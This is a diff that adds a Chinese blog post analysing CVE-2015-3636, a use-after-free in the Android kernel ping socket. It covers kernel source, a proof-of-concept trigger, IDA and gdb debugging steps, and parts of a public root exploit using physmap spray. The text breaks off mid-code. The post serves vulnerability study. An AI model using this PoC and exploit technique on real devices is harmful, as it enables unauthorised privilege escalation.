@@ -150,6 +150,232 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-CVE-2015-3636" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/14/CVE-2015-3636/">CVE-2015-3636</a>
+    </h1>
+  
+
+        
+        <a href="/2018/08/14/CVE-2015-3636/" class="archive-article-date">
+  	<time datetime="2018-08-14T07:35:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="CVE-2015-3636-pingpong-root-android内核-UAF漏洞分析【转】"><a href="#CVE-2015-3636-pingpong-root-android内核-UAF漏洞分析【转】" class="headerlink" title="CVE-2015-3636(pingpong root)android内核 UAF漏洞分析【转】"></a>CVE-2015-3636(pingpong root)android内核 UAF漏洞分析【转】</h3><ul>
+<li>在看雪中随便翻翻，看到CVE-2015-3636，决定跟着复现做一遍~</li>
+<li>网上已有很多分析3636的文章，原理也有很多、本文转自看雪<a href="https://bbs.pediy.com/thread-230298.htm" target="_blank" rel="noopener">原文</a></li>
+</ul>
+<ul>
+<li><p>这个<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Xu-Ah-Universal-Android-Rooting-Is-Back-wp.pdf" target="_blank" rel="noopener">漏洞</a>keen在blackhat上讲过，是一个很经典的android内核漏洞，也是第一个64bit root，还是很有学习价值的。</p>
+</li>
+<li><p>分析android内核的漏洞需要自己下载android源代码和内核源代码，reverse patch，编译调试。吾爱破解有个比赛就是写这个漏洞的exploit，并且还提供了相应的环境。<a href="https://www.52pojie.cn/thread-480759-1-1.html" target="_blank" rel="noopener">吾爱破解2016安全挑战赛</a></p>
+</li>
+<li><p>把内核源代码下载下来看看=</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://aosp.tuna.tsinghua.edu.cn/kernel/common.git</span><br><span class="line">git checkout remotes/origin/android-3.4 -b android-3.4</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>当调用socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP)创建socket再调用connect时，在内核中调用到了inet_dgram_connect</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_dgram_connect</span><span class="params">(struct socket *sock, struct sockaddr * uaddr,</span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="keyword">int</span> addr_len, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (addr_len &lt; <span class="keyword">sizeof</span>(uaddr-&gt;sa_family))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (uaddr-&gt;sa_family == AF_UNSPEC)</span><br><span class="line">        <span class="keyword">return</span> sk-&gt;sk_prot-&gt;disconnect(sk, flags);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!inet_sk(sk)-&gt;inet_num &amp;&amp; inet_autobind(sk))</span><br><span class="line">        <span class="keyword">return</span> -EAGAIN;</span><br><span class="line">    <span class="keyword">return</span> sk-&gt;sk_prot-&gt;connect(sk, (struct sockaddr *)uaddr, addr_len);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(inet_dgram_connect);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果sa_family==AF_UNSPEC会根据协议类型调用相应的disconnect routine，对于PROTO_ICMP来说就是udp_disconnect</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">udp_disconnect</span><span class="params">(struct sock *sk, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">inet</span> = <span class="title">inet_sk</span>(<span class="title">sk</span>);</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 1003.1g - break association.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"> </span><br><span class="line">    sk-&gt;sk_state = TCP_CLOSE;</span><br><span class="line">    inet-&gt;inet_daddr = <span class="number">0</span>;</span><br><span class="line">    inet-&gt;inet_dport = <span class="number">0</span>;</span><br><span class="line">    sock_rps_reset_rxhash(sk);</span><br><span class="line">    sk-&gt;sk_bound_dev_if = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(sk-&gt;sk_userlocks &amp; SOCK_BINDADDR_LOCK))</span><br><span class="line">        inet_reset_saddr(sk);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!(sk-&gt;sk_userlocks &amp; SOCK_BINDPORT_LOCK)) &#123;</span><br><span class="line">        sk-&gt;sk_prot-&gt;unhash(sk);</span><br><span class="line">        inet-&gt;inet_sport = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sk_dst_reset(sk);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(udp_disconnect);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>最终会调用到ping_unhash</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ping_unhash</span><span class="params">(struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">isk</span> = <span class="title">inet_sk</span>(<span class="title">sk</span>);</span></span><br><span class="line">    pr_debug(<span class="string">"ping_unhash(isk=%p,isk-&gt;num=%u)\n"</span>, isk, isk-&gt;inet_num);</span><br><span class="line">    <span class="keyword">if</span> (sk_hashed(sk)) &#123;</span><br><span class="line">        write_lock_bh(&amp;ping_table.lock);</span><br><span class="line">        hlist_nulls_del(&amp;sk-&gt;sk_nulls_node);</span><br><span class="line">        sk_nulls_node_init(&amp;sk-&gt;sk_nulls_node);</span><br><span class="line">        sock_put(sk);</span><br><span class="line">        isk-&gt;inet_num = <span class="number">0</span>;</span><br><span class="line">        isk-&gt;inet_sport = <span class="number">0</span>;</span><br><span class="line">        sock_prot_inuse_add(sock_net(sk), sk-&gt;sk_prot, <span class="number">-1</span>);</span><br><span class="line">        write_unlock_bh(&amp;ping_table.lock);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(ping_unhash);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果sk_hashed条件成立，则会调用hlist_nulls_del在一个双向链表hlist中删除sk_nulls_node</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __hlist_nulls_del(struct hlist_nulls_node *n)</span><br><span class="line">&#123;</span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> *<span class="title">next</span> = <span class="title">n</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> **<span class="title">pprev</span> = <span class="title">n</span>-&gt;<span class="title">pprev</span>;</span></span><br><span class="line">         *pprev = next;</span><br><span class="line">         <span class="keyword">if</span> (!is_a_nulls(next))</span><br><span class="line">                   next-&gt;pprev = pprev;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">hlist_nulls_del</span><span class="params">(struct hlist_nulls_node *n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         __hlist_nulls_del(n);</span><br><span class="line">         n-&gt;pprev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当n也就是sk_nulls_node被删除之后n-&gt;pprev被设置为LIST_POISON2，值是固定的0x200200。</p>
+</li>
+<li><p>看以下第二次connect的时候sk_hashed条件是否成立</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">sk_unhashed</span><span class="params">(<span class="keyword">const</span> struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         <span class="keyword">return</span> hlist_unhashed(&amp;sk-&gt;sk_node);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">sk_hashed</span><span class="params">(<span class="keyword">const</span> struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         <span class="keyword">return</span> !sk_unhashed(sk);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">hlist_unhashed</span><span class="params">(<span class="keyword">const</span> struct hlist_node *h)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         <span class="keyword">return</span> !h-&gt;pprev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以注意到sk_node和sk_nulls_node共用一个union，两者的定义也十分类似。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sk_node            __sk_common.skc_node</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sk_nulls_node      __sk_common.skc_nulls_node</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>  <span class="title">skc_node</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> <span class="title">skc_nulls_node</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> *<span class="title">next</span>, **<span class="title">pprev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> *<span class="title">next</span>, **<span class="title">pprev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>虽然设置的是sk_nulls_node-&gt;pprev判断的是sk_node-&gt;pprev，但实际上相同；</p>
+<p>sk_hashed条件成立，再次删除已经删除的对象，执行*pprev=next时pprev已经是0x200200</p>
+<p>如果这个地址没有映射到用户态就会kernel panic。</p>
+</li>
+<li><p>keen给的POC</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span> = &#123;</span> .sa_family = AF_INET &#125;;</span><br><span class="line"><span class="keyword">int</span> ret = connect(sockfd, &amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> _<span class="title">addr</span> = &#123;</span> .sa_family = AF_UNSPEC &#125;;</span><br><span class="line">ret = connect(sockfd, &amp;_addr, <span class="keyword">sizeof</span>(_addr));</span><br><span class="line">ret = connect(sockfd, &amp;_addr, <span class="keyword">sizeof</span>(_addr));</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>poc中第一次AF_INET的connect是为了将sk加入hlist中。</p>
+<ul>
+<li>poc的效果</li>
+</ul>
+<p><img src="/2018/08/14/CVE-2015-3636/1.png" alt="1"></p>
+<p><img src="/2018/08/14/CVE-2015-3636/2.png" alt="2"></p>
+<p><code>Unable to handle kernel paging request at virtual address</code>的地址是0x1360而不是0x200200，可能出题的人在这里修改了一下。</p>
+<p>在IDA里面看看。如果采取自己编译调试的方式是可以加载vmlinux符号文件的，这里我们就只能自己从机器上得到函数地址和名称然后加载到IDA中了。把Image拖到IDA64中，Process type选择ARM Little-endian [ARM]。<img src="/2018/08/14/CVE-2015-3636/3.png" alt="3"></p>
+<p>把ROM start address和Loading address设置为0xFFFFFFC000080000(32位系统就是0xC0008000)。Android 8.0中才为4.4及以后的内核引入了KASLR，很显然我们这里没有KASLR，这个值是固定的。</p>
+<p><img src="/2018/08/14/CVE-2015-3636/4.png" alt="4"></p>
+<p>且选择64bit。</p>
+<p><img src="/2018/08/14/CVE-2015-3636/5.png" alt="5"></p>
+<p>在这个时候用IDA是什么也识别不出来的，因为Image文件并不是一个ELF，用binwalk看一下就会发现其实它组成还挺复杂。</p>
+<p>我们接下来从运行的虚拟机中导出内核函数名称和地址。在ubuntu这样的发行版和android内核中有<code>Kernel Address Display Restriction</code>，所以先把它关掉。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">" echo 0 &gt; /proc/sys/kernel/kptr_restrict"</span></span><br><span class="line">cat /proc/kallsyms &gt; /data/<span class="built_in">local</span>/tmp/1.txt</span><br><span class="line">adb pull /data/<span class="built_in">local</span>/tmp/1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/08/14/CVE-2015-3636/6.png" alt="6"></p>
+<p>写一个简答的idc脚本把这些函数名加载到IDA里面。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ksyms = open(<span class="string">"D:\\1.txt"</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> ksyms:</span><br><span class="line">    addr = int(line[<span class="number">0</span>:<span class="number">16</span>],<span class="number">16</span>)</span><br><span class="line">    name = line[<span class="number">19</span>:].replace(<span class="string">'_'</span>,<span class="string">''</span>)</span><br><span class="line">    name = line[<span class="number">19</span>:].replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">    idc.MakeCode(addr)</span><br><span class="line">    idc.MakeFunction(addr)</span><br><span class="line">    idc.MakeName(addr,name)</span><br><span class="line">    Message(<span class="string">"%08X:%s"</span>%(addr,name))</span><br></pre></td></tr></table></figure>
+<p>出来的函数列表里面只有ping_hash没有ping_unhash。</p>
+<p>把ping_hash的End address改成0xFFFFFFC000409614。</p>
+<p>再在0xFFFFFFC000409614处create function处理一下就可以了。</p>
+<p><img src="/2018/08/14/CVE-2015-3636/7.png" alt="7"></p>
+<p>可以看到crash处0xFFFFFFC000409644和前后的代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROM:FFFFFFC00040963C                 LDR             X1, [X19,#0x38]</span><br><span class="line">ROM:FFFFFFC000409640                 LDR             X0, [X19,#0x30]</span><br><span class="line">ROM:FFFFFFC000409644                 STR             X0, [X1]</span><br></pre></td></tr></table></figure>
+<p>这三行代码对应源代码中的下面三行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> *<span class="title">next</span> = <span class="title">n</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> **<span class="title">pprev</span> = <span class="title">n</span>-&gt;<span class="title">pprev</span>;</span></span><br><span class="line">*pprev = next;</span><br></pre></td></tr></table></figure>
+<p>进一步确认了漏洞成因和我们前面所分析的一样。主要参考如下：</p>
+<p><a href="http://www.hhjack.com/arm64_zimage_reverseengineering_with_ida_pro/" target="_blank" rel="noopener">逆向ARM64内核zlmage</a></p>
+<p><a href="https://blog.csdn.net/QQ1084283172/article/details/57074695" target="_blank" rel="noopener">从Android设备中提取内核和逆向分析</a></p>
+<ul>
+<li><p>接下来还是回到正题，既然说这是一个UAF漏洞那么哪里UAF了呢？在<code>hlist_nulls_del</code>之后还有一个<code>sock_put</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ungrab socket and destroy it, if it was the last reference. */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">sock_put</span><span class="params">(struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (atomic_dec_and_test(&amp;sk-&gt;sk_refcnt))</span><br><span class="line">        sk_free(sk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>sock_put将sk的引用计数减1，并且判断其值是否为0，如果为0的话就free掉sk</li>
+<li>可以想到最后一次connect进入本不该进入的if分支之后如果我们提前mmap了0x200200(这里是0x1360)就不会崩溃，接下来进入sock_put，引用计数变成0，sk被free掉，但是文件描述符还在用户空间，这就造成了UAF。</li>
+</ul>
+</li>
+</ul>
+<h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><p>我们可以先测一下这个EXP。EXP用的github上的：<a href="https://github.com/4B5F5F4B/Exploits/tree/master/Linux/CVE-2015-3636" target="_blank" rel="noopener">EXP</a>。</p>
+<p>不过要注意的是必须用adb shell过去然后su shell才能继承root的权限得到建立socket的权限。测试发现这个EXP确实是可用的，下面就开始调试。<img src="/2018/08/14/CVE-2015-3636/8.png" alt="8"></p>
+<p>调试时的命令如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-aarch64 -cpu cortex-a57 -machine <span class="built_in">type</span>=ranchu -m 1024 -append <span class="string">'console=ttyAMA0,38400 keep_bootcon earlyprintk=ttyAMA0'</span> -serial mon:stdio -kernel Image -initrd /home/hjy/Desktop/android-problem-env/ramdisk.img -drive index=0,id=sdcard,file=/home/hjy/Desktop/android-problem-env/system.img -device virtio-blk-device,drive=sdcard -drive index=1,id=userdata,file=/home/hjy/Desktop/android-problem-env/.//userdata.img -device virtio-blk-device,drive=userdata -drive index=2,id=cache,file=/home/hjy/Desktop/android-problem-env/cache.img -device virtio-blk-device,drive=cache -drive index=3,id=system,file=/home/hjy/Desktop/android-problem-env/system.img -device virtio-blk-device,drive=system -netdev user,id=mynet -device virtio-net-device,netdev=mynet -show-cursor -nographic -L lib/pc-bios -gdb tcp::1234,ipv4 –S</span><br></pre></td></tr></table></figure>
+<p>这里又有一个很坑的地方，用NDK里面的gdb去调试会报Remote ‘g’ packet reply is too long。</p>
+<p>需要自己修改gdb源代码并且编译：参考=<a href="https://blog.csdn.net/bupt073114/article/details/25211319" target="_blank" rel="noopener">重新编译arm-linux-androideabi-gdb和gdbserver：</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://android.googlesource.com/toolchain/gdb.git</span><br></pre></td></tr></table></figure>
+<p>下载下来发现有gdb-7.11和gdb-8.0.1两个文件夹，由于pwndbg和GEF等插件目前好像还不支持gdb 8.x，所以我们选择gdb-7.11。</p>
+<p>找到gdb-7.11/gdb目录下的remote.c文件，注释掉这两行。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (buf_len &gt; <span class="number">2</span> * rsa-&gt;sizeof_g_packet)</span><br><span class="line">   error (_(“Remote ‘g’ packet reply is too <span class="keyword">long</span>: %s”), rs-&gt;buf);</span><br></pre></td></tr></table></figure>
+<p>在后面加上下面这几行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (buf_len &gt; <span class="number">2</span> * rsa-&gt;sizeof_g_packet) </span><br><span class="line"> &#123;</span><br><span class="line">    rsa-&gt;sizeof_g_packet = buf_len ;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; gdbarch_num_regs (gdbarch); i++)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">if</span> (rsa-&gt;regs[i].pnum == <span class="number">-1</span>)</span><br><span class="line">       <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">       <span class="keyword">if</span> (rsa-&gt;regs[i].offset &gt;= rsa-&gt;sizeof_g_packet)</span><br><span class="line">       rsa-&gt;regs[i].in_g_packet = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       rsa-&gt;regs[i].in_g_packet = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>编译安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --target=aarch64-linux-androideabi --prefix=/home/hjy/Desktop/gdb_build/gdb/gdb-7.11/arm-linux</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+<p>安装GEF，因为很多人说pwndbg比较卡而GEF不卡。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh</span><br></pre></td></tr></table></figure>
+<p>开始调试了:</p>
+<p>不过还有一个小坑，我们应该用<code>gef-remote -q localhost:1234</code>也就是加上-q参数不然会报错:<a href="https://github.com/hugsy/gef/issues/124" target="_blank" rel="noopener">原因</a></p>
+<p>进入漏洞利用的部分：</p>
+<p>可以看到在main函数中整个漏洞触发漏洞的过程和POC中一样。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vultrig_socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);</span><br><span class="line">ret = connect(vultrig_socks[i], &amp;addr1, <span class="keyword">sizeof</span>(addr1));</span><br><span class="line">system(<span class="string">"echo 4096 &gt; /proc/sys/vm/mmap_min_addr"</span>);</span><br><span class="line"><span class="keyword">void</span>* user_mm = mmap(PAGE_SIZE, MAX_NULLMAP_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">ret = connect(vultrig_socks[i], &amp;addr2, <span class="keyword">sizeof</span>(addr2));</span><br><span class="line">ret = connect(vultrig_socks[i], &amp;addr2, <span class="keyword">sizeof</span>(addr2));</span><br></pre></td></tr></table></figure>
+<p>修改mmap_min_addr并mmap就是为了避免崩溃这样才能执行到sock_put的逻辑。接下来的操作叫做physmap spray，大家如果对<code>CVE-2014-3153(towelroot)</code>还有印象的话，会记得它是通过sendmmsg修改内核数据的，keen在文章中解释了，通过sendmmsg完成堆喷的条件是存在漏洞的对象大小必须和SLAB分配器通常使用的大小一致。而在一些android设备上，PING sock对象的大小是576，不是期望的512或者1024。这样就很难对齐，利用会很不稳定，所以采用的是physmap spray的方法。</p>
+<p><img src="/2018/08/14/CVE-2015-3636/9.png" alt="9"></p>
+<p>在内核中physmap在一个相对较高的地址，而SLAB通常在一个相对较低的地址，通过喷射其它的内核对象使得SLAB分配器在相对高的地址分配PING sock对象造成physmap和SLAB重叠，这个过程叫做<strong><em>lifting</em></strong>。这里的“其它的内核对象”直接用PING sock对象其实就可以。</p>
+<p><img src="/2018/08/14/CVE-2015-3636/10.png" alt="10"></p>
+<p><img src="/2018/08/14/CVE-2015-3636/11.png" alt="11"></p>
+<p>然后释放掉用来做lifting的PING sock对象，和physmap重叠的那一部分则留做触发漏洞。</p>
+<p>那么怎样才能知道什么时候PING sock对象已经被physmap中的数据填充了可以停止喷射以及怎样找到已经被填充的PING sock对象呢？</p>
+<p>在physmap spray中进行了大量的mmap操作，</p>
+<p>并且将<code>mapped_page+0x1D8</code>处赋值为<code>MAGIC_VALUE+physmap_spray_pages_count</code>，</p>
+<p>接下来<code>search_exploitable_socket</code>的时候用ioctl一个一个去试。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ioctl(exp_sock, SIOCGSTAMPNS, &amp;time);</span><br></pre></td></tr></table></figure>
+<p>这里的time是timespec结构体，会调用到sock_get_timestampns。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_get_timestampns</span><span class="params">(struct sock *sk, struct timespec __user *userstamp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">ts</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!sock_flag(sk, SOCK_TIMESTAMP))</span><br><span class="line">        sock_enable_timestamp(sk, SOCK_TIMESTAMP);</span><br><span class="line">    ts = ktime_to_timespec(sk-&gt;sk_stamp);</span><br><span class="line">    <span class="keyword">if</span> (ts.tv_sec == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOENT;</span><br><span class="line">    <span class="keyword">if</span> (ts.tv_sec == <span class="number">0</span>) &#123;</span><br><span class="line">        sk-&gt;sk_stamp = ktime_get_real();</span><br><span class="line">        ts = ktime_to_timespec(sk-&gt;sk_stamp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> 